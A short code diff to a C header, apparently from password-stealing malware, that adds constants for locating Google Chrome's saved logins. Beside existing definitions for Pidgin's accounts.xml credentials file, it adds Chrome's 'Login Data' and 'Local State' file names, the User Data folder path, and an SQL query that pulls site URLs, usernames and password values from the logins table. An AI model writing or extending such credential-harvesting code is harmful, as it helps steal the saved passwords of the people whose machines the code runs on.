@@ -39,3 +39,8 @@
 #define PIDGIN_FILE L"accounts.xml"
 #define PIDGIN_XPATH L"//account/account"
 #define PIDGIN_FOLDER L"\\.purple"
+
+#define CHROME_FILES_SEARCH L"login data"
+#define CHROME_CONFIG_FILE L"Local State"
+#define CHROME_FOLDER L"\\Google\\Chrome\\User Data"
+#define CHROME_SQL_QUERY "SELECT action_url, username_value, password_value FROM logins"
